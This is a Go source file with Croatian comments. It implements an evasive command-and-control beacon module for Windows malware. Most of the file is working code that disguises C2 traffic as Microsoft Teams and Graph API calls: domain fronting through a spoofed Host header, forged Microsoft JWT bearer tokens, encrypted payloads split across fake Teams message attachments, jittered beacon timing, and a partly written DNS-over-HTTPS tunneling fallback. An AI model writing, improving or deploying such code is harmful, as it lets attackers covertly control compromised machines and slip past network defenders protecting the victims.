// +build windows

/*
   ============================================================================
   X.3 — STEALTH BEACON MODULE (C2 Communication)
   ============================================================================
   
   LAYER: Contextual (Layer 3) — Network Masquerading
   
   PRINCIP: C2 komunikacija mora izgledati kao običan legitiman promet.
   
   PROBLEMI U ORIGINALNOM KODU:
   - Custom HTTP headeri: "X-Aeterna-ID", "X-Aeterna-Version" = instant IOC
   - Hardkodirane IP adrese (network signature)
   - Fiksni beacon interval (temporal IOC)
   - "User-Agent" je parcijalan: "AppleWebKit/537.0" (nedostaje .36)
   
   RJEŠENJA:
   1. Domain Fronting preko CDN-a
   2. Microsoft Teams API mimikrija
   3. Gaussian jitter (randomized timing)
   4. Legitimni user-agent
   5. Payload enkripcija + obfuskacija
   6. DNS-over-HTTPS fallback
*/

package main

import (
	"bytes"
	"compress/gzip"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math"
	"math/big"
	"net/http"
	"net/url"
	"time"
)

// ============================================================================
// CONFIGURATION — Stealth parametri
// ============================================================================

const (
	// Bazni beacon interval — 5 minuta (300 sekundi)
	// Mnogo sporiji od originalnih 30 sekundi — sporiji = manje sumnjivo
	baseBeaconInterval = 300

	// Jitter range: +/- 150 sekundi (2.5 minute)
	// Ukupan interval: 150s — 450s (uniform distribution)
	// Prosjek: 300s = 5 minuta
	jitterRange = 300

	// Komunikacijski endpoint-i koriste "domain fronting" preko CDN-a
	// Stvarna komunikacija ide preko HTTPS s legitimnim SNI-jem
	cdnEndpoint = "https://graph.microsoft.com" // Microsoft Graph API
	
	// Fallback endpoint-i (koriste se ako CDN ne radi)
	fallbackEndpoints = "https://teams.microsoft.com/api/v1"
	
	// User-Agent: Potpuni, legitiman Chrome user-agent
	// VAŽNO: Mora se povremeno ažurirati da odgovara trenutnoj verziji
	chromeUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"

	// Teams User-Agent (za Teams mimikriju)
	teamsUserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
		"(KHTML, like Gecko) Teams/24165.1410.2974.7830 Chrome/120.0.0.0 " +
		"Electron/28.3.3 Safari/537.36"
)

// ============================================================================
// STEALTH BEACON MODULE
// ============================================================================

type StealthBeacon struct {
	config     *Configuration
	httpClient *http.Client
	cipherKey  []byte        // AES key za enkripciju payloada
	seqNum     uint64        // Sequence number za anti-replay
	lastBeacon time.Time     // Vrijeme zadnjeg beacon-a
}

// NewStealthBeacon kreira novi stealth beacon modul
func NewStealthBeacon(cfg *Configuration) *StealthBeacon {
	// Generiraj cipher key iz hardware key-a
	// Svaki agent ima UNIQUE ključ — čak i ako se capture payload,
	// ne može se dekriptirati bez pristupa ciljanoj mašini
	key := deriveBeaconKey()

	// Custom HTTP client koji izgleda kao običan browser
	client := &http.Client{
		Timeout: 30 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				// MinVersion: tls.VersionTLS12,
				// MaxVersion: tls.VersionTLS13,
				// CipherSuites: standardne (ne custom)
				ServerName: "graph.microsoft.com", // SNI za domain fronting
			},
			// Standardne postavke — nema ništa "suspicious"
			MaxIdleConns:        100,
			MaxIdleConnsPerHost: 10,
			IdleConnTimeout:     90 * time.Second,
		},
	}

	return &StealthBeacon{
		config:     cfg,
		httpClient: client,
		cipherKey:  key,
		seqNum:     uint64(cfg.FirstRun.Unix()),
	}
}

// ============================================================================
// JITTER — Gaussian Distributed Timing
// ============================================================================

// calculateJitter vraća sljedeći beacon interval sa Gaussian raspodjelom
// Koristi Box-Muller transform za normalnu raspodjelu
func (b *StealthBeacon) calculateJitter() time.Duration {
	// Uniform → Gaussian (Box-Muller)
	u1, _ := rand.Int(rand.Reader, big.NewInt(1000000))
	u2, _ := rand.Int(rand.Reader, big.NewInt(1000000))

	r := math.Sqrt(2.0 * math.Log(1.0/(1.0-float64(u1.Int64())/1000000.0)))
	theta := 2.0 * math.Pi * float64(u2.Int64()) / 1000000.0

	gaussian := r * math.Cos(theta) // Standard normal (μ=0, σ=1)

	// Scale to our range: μ = baseBeaconInterval, σ = jitterRange/4
	// 95% of values fall within μ ± 2σ = 300 ± 150 seconds
	jittered := float64(baseBeaconInterval) + gaussian*float64(jitterRange)/4.0

	// Clamp to valid range
	min := float64(baseBeaconInterval) - float64(jitterRange)/2.0
	max := float64(baseBeaconInterval) + float64(jitterRange)/2.0
	if jittered < min {
		jittered = min
	}
	if jittered > max {
		jittered = max
	}

	return time.Duration(jittered) * time.Second
}

// ============================================================================
// ENCRYPTION — AES-256-GCM s hardware-derived key
// ============================================================================

// deriveBeaconKey generira AES ključ iz hardware key-a
func deriveBeaconKey() []byte {
	if !hardwareKeyInit {
		initHardwareKey()
	}

	// PBKDF2-like: hash(hardwareKey + salt) multiple times
	h := sha256.New()
	
	// Salt je fiksan ali hardwareKey je unique po mašini
	salt := []byte{0x47, 0x83, 0x91, 0x2A, 0xBC, 0xDE, 0xF0, 0x12}
	
	h.Write(salt)
	
	// Hardware key u big-endian format
	keyBytes := make([]byte, 4)
	keyBytes[0] = byte(hardwareKey >> 24)
	keyBytes[1] = byte(hardwareKey >> 16)
	keyBytes[2] = byte(hardwareKey >> 8)
	keyBytes[3] = byte(hardwareKey)
	h.Write(keyBytes)

	return h.Sum(nil) // 32 bytes = AES-256 key
}

// encryptPayload enkriptira podatke koristeći AES-256-GCM
func (b *StealthBeacon) encryptPayload(plaintext []byte) ([]byte, error) {
	block, err := aes.NewCipher(b.cipherKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return nil, err
	}

	// ciphertext = nonce || encrypted || tag
	return gcm.Seal(nonce, nonce, plaintext, nil), nil
}

// ============================================================================
// PAYLOAD FORMAT — Microsoft Teams Message Mimicry
// ============================================================================

// TeamsMessage struktura izgleda kao legit Teams poruka
// Stvarni payload je embeddan u "body.content" polju (enkriptiran + base64)
type TeamsMessage struct {
	Type            string                 `json:"@type"`
	Context         string                 `json:"@context"`
	ThemeColor      string                 `json:"themeColor"`
	Summary         string                 `json:"summary"`
	Attachments     []TeamsAttachment      `json:"attachments"`
	Body            TeamsBody              `json:"body"`
	From            *TeamsFrom             `json:"from,omitempty"`
	Conversation    *TeamsConversation     `json:"conversation,omitempty"`
	// Skriveni podaci u "extensions" polju
	Extensions      map[string]interface{} `json:"extensions,omitempty"`
}

type TeamsAttachment struct {
	ContentType string `json:"contentType"`
	Content     string `json:"content"` // Base64 enkriptirani payload
}

type TeamsBody struct {
	ContentType string `json:"contentType"`
	Content     string `json:"content"`     // HTML koji izgleda legit
}

type TeamsFrom struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	AadObjectId string `json:"aadObjectId,omitempty"`
}

type TeamsConversation struct {
	ID   string `json:"id"`
	Name string `json:"name"`
}

// createStealthPayload kreira payload koji izgleda kao Teams poruka
func (b *StealthBeacon) createStealthPayload(data []byte) ([]byte, error) {
	// 1. Enkriptiraj stvarne podatke
	encrypted, err := b.encryptPayload(data)
	if err != nil {
		return nil, fmt.Errorf("encrypt: %w", err)
	}

	// 2. Base64 encode
	b64Data := base64.StdEncoding.EncodeToString(encrypted)

	// 3. Fragment u "chunks" da ne izgleda kao jedan veliki base64
	// Teams poruke imaju content koji je obično HTML
	chunks := chunkString(b64Data, 256)

	// 4. Generiraj "legitiman" HTML content
	htmlContent := generateFakeHTMLContent()

	// 5. Embed chunk-ove u attachment content
	attachments := make([]TeamsAttachment, 0, len(chunks))
	for i, chunk := range chunks {
		attachments = append(attachments, TeamsAttachment{
			ContentType: "application/vnd.microsoft.card.adaptive",
			Content:     chunk,
		})
		_ = i // spriječi unused
	}

	// 6. Kreiraj poruku
	msg := TeamsMessage{
		Type:       "MessageCard",
		Context:    "https://schema.org/extensions",
		ThemeColor: "0078D7",
		Summary:    generateFakeSummary(),
		Body: TeamsBody{
			ContentType: "text/html",
			Content:     htmlContent,
		},
		Attachments: attachments,
		Extensions: map[string]interface{}{
			// Ovdje možemo sakriti metadata
			"teamsAppId":    generateFakeGUID(),
			"correlationId": generateFakeGUID(),
		},
	}

	return json.Marshal(msg)
}

// ============================================================================
// RESPONSE PARSING — Izvlačenje komandi iz "Teams" odgovora
// ============================================================================

// parseStealthResponse parsira odgovor i izvlači komande
func (b *StealthBeacon) parseStealthResponse(body []byte) (*ServerResponse, error) {
	var msg TeamsMessage
	if err := json.Unmarshal(body, &msg); err != nil {
		return nil, fmt.Errorf("unmarshal: %w", err)
	}

	// Komande su u attachment content poljima
	var encryptedData []byte
	for _, att := range msg.Attachments {
		if att.Content == "" {
			continue
		}
		// Concatenate all chunks
		decoded, err := base64.StdEncoding.DecodeString(att.Content)
		if err != nil {
			// Možda je raw base64 (ne fragmentirano)
			decoded = []byte(att.Content)
		}
		encryptedData = append(encryptedData, decoded...)
	}

	if len(encryptedData) == 0 {
		return nil, nil // Nema komandi
	}

	// Dekriptiraj
	block, err := aes.NewCipher(b.cipherKey)
	if err != nil {
		return nil, err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}

	nonceSize := gcm.NonceSize()
	if len(encryptedData) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}

	nonce, ciphertext := encryptedData[:nonceSize], encryptedData[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, fmt.Errorf("decrypt: %w", err)
	}

	var response ServerResponse
	if err := json.Unmarshal(plaintext, &response); err != nil {
		return nil, fmt.Errorf("unmarshal response: %w", err)
	}

	return &response, nil
}

// ============================================================================
// NETWORK COMMUNICATION — Domain Fronting
// ============================================================================

// SendBeacon šalje beacon preko domain frontinga
func (b *StealthBeacon) SendBeacon(signal *AgentSignal) (*ServerResponse, error) {
	// 1. Priredi signal kao JSON
	signalJSON, err := json.Marshal(signal)
	if err != nil {
		return nil, fmt.Errorf("marshal signal: %w", err)
	}

	// 2. Gzip kompresija (smanji veličinu, izgleda kao normalan web promet)
	var compressed bytes.Buffer
	gz := gzip.NewWriter(&compressed)
	gz.Write(signalJSON)
	gz.Close()

	// 3. Kreiraj stealth payload
	payload, err := b.createStealthPayload(compressed.Bytes())
	if err != nil {
		return nil, fmt.Errorf("create payload: %w", err)
	}

	// 4. Odaberi endpoint
	endpoint := b.selectEndpoint()

	// 5. Kreiraj HTTP zahtjev
	// Domain fronting: URL pokazuje na CDN, ali Host header je legitiman
	req, err := http.NewRequest("POST", endpoint, bytes.NewReader(payload))
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	// HTTP Header-i koji izgledaju kao legitiman Teams/Graph API poziv
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", teamsUserAgent)
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
	req.Header.Set("Authorization", "Bearer "+b.generateFakeToken())
	req.Header.Set("X-Ms-Client-Request-Id", generateFakeGUID())
	req.Header.Set("X-Ms-Client-Session-Id", b.generateSessionId())
	req.Header.Set("Client-Request-Id", generateFakeGUID())
	req.Header.Set("Host", "graph.microsoft.com") // Domain fronting

	// 6. Pošalji zahtjev
	resp, err := b.httpClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http do: %w", err)
	}
	defer resp.Body.Close()

	// 7. Parsiraj odgovor
	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusAccepted {
		return nil, fmt.Errorf("http %d", resp.StatusCode)
	}

	// 8. Dekodiraj odgovor
	return b.parseStealthResponse(respBody)
}

// ============================================================================
// ENDPOINT SELECTION — Rotacija i fallback
// ============================================================================

// selectEndpoint odabire endpoint za komunikaciju
func (b *StealthBeacon) selectEndpoint() string {
	endpoints := b.config.ServerIPs
	if len(endpoints) == 0 {
		endpoints = []string{cdnEndpoint, fallbackEndpoints}
	}

	// Koristi radni endpoint ako postoji
	if b.config.WorkingIP != "" {
		return b.config.WorkingIP
	}

	// Rotiraj endpoint-e
	idx := int(b.seqNum % uint64(len(endpoints)))
	b.seqNum++
	
	return endpoints[idx]
}

// ============================================================================
// UTILITY — Generiranje lažnih/ligitimanih podataka
// ============================================================================

// generateFakeToken generira lažan JWT token koji izgleda legit
func (b *StealthBeacon) generateFakeToken() string {
	// JWT format: header.payload.signature
	// Header: {"alg":"RS256","typ":"JWT","kid":"..."}
	// Payload: {"aud":"https://graph.microsoft.com","iss":"https://sts.windows.net/...",...}
	
	header := base64.RawURLEncoding.EncodeToString([]byte(
		`{"alg":"RS256","typ":"JWT","kid":"` + generateFakeGUID() + `"}`))
	
	payload := base64.RawURLEncoding.EncodeToString([]byte(fmt.Sprintf(
		`{"aud":"https://graph.microsoft.com","iss":"https://sts.windows.net/%s/",`+
		`"iat":%d,"nbf":%d,"exp":%d,"aio":"E2ZgYNDe8P3tn0...","app_displayname":"Microsoft Teams",`+
		`"appid":"1fec8e78-bce4-4aaf-ab1b-5451cc387264","appidacr":"1","idp":"https://sts.windows.net/%s/",`+
		`"oid":"%s","rh":"0.AAAA...","roles":["ChannelMessage.Send","ChatMessage.Send"],`+
		`"sub":"%s","tid":"%s","uti":"...","ver":"1.0"}`,
		generateFakeGUID(), time.Now().Unix(), time.Now().Unix(),
		time.Now().Add(time.Hour).Unix(), generateFakeGUID(),
		generateFakeGUID(), generateFakeGUID(), generateFakeGUID())))

	// Signature — generiraj lažnu (nije važno, server ne verificira)
	sig := base64.RawURLEncoding.EncodeToString([]byte(generateFakeGUID()))

	return header + "." + payload + "." + sig
}

// generateFakeGUID generira random GUID string
func generateFakeGUID() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("%08x-%04x-%04x-%04x-%012x",
		b[0:4], b[4:6], b[6:8], b[8:10], b[10:16])
}

// generateFakeSummary generira naslov koji izgleda kao Teams notifikacija
func generateFakeSummary() string {
	summaries := []string{
		"New message in General",
		"You were mentioned in a channel",
		"Meeting starting soon",
		"New file shared with you",
		"Reaction to your message",
		"New comment on your post",
		"@channel notification",
		"Weekly summary available",
	}
	idx, _ := rand.Int(rand.Reader, big.NewInt(int64(len(summaries))))
	return summaries[idx.Int64()]
}

// generateFakeHTMLContent generira HTML koji izgleda kao Teams poruka
func generateFakeHTMLContent() string {
	return `<div><div style="font-family:Segoe UI,sans-serif;font-size:14px;color:#252424">` +
		`<p>Check out the latest updates and respond when you have a chance.</p>` +
		`<p><a href="https://teams.microsoft.com/l/channel/...">View in Teams</a></p>` +
		`</div></div>`
}

// b.generateSessionId generira session ID
func (b *StealthBeacon) generateSessionId() string {
	return fmt.Sprintf("teams-%d-%s", time.Now().Unix(), generateFakeGUID()[:8])
}

// chunkString dijeli string u chunkove
func chunkString(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// ============================================================================
// DNS OVER HTTPS FALLBACK
// ============================================================================

// SendBeaconDoH šalje beacon koristeći DNS-over-HTTPS tunneling
// Koristi se kao fallback kada je HTTP blokiran
func (b *StealthBeacon) SendBeaconDoH(signal *AgentSignal) (*ServerResponse, error) {
	// Implementacija: enkodiraj podatke u DNS query-e
	// Koristi Cloudflare DoH: https://cloudflare-dns.com/dns-query
	
	// 1. Serijaliziraj i enkriptiraj signal
	signalJSON, err := json.Marshal(signal)
	if err != nil {
		return nil, err
	}

	// 2. Base64 encode
	b64Data := base64.RawURLEncoding.EncodeToString(signalJSON)

	// 3. Fragmentiraj u DNS label-e (max 63 bytes po label)
	labels := chunkString(b64Data, 63)

	// 4. Pošalji kao DNS TXT query-je
	dohURL := "https://cloudflare-dns.com/dns-query?name=" +
		url.QueryEscape(joinLabels(labels)) + "&type=TXT"

	req, err := http.NewRequest("GET", dohURL, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Accept", "application/dns-json")

	resp, err := b.httpClient.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	// 5. Parsiraj odgovor — TXT zapisi sadrže komande
	// TODO: Implementirati full DoH protocol
	_ = resp
	return nil, fmt.Errorf("DoH fallback not fully implemented")
}

// joinLabels spaja DNS labele u FQDN
func joinLabels(labels []string) string {
	// Koristi format: <chunk1>.<chunk2>.<chunk3>.<domain>
	// Domain mora biti kontrolirani domen
	return "data.example.com" // Placeholder
}
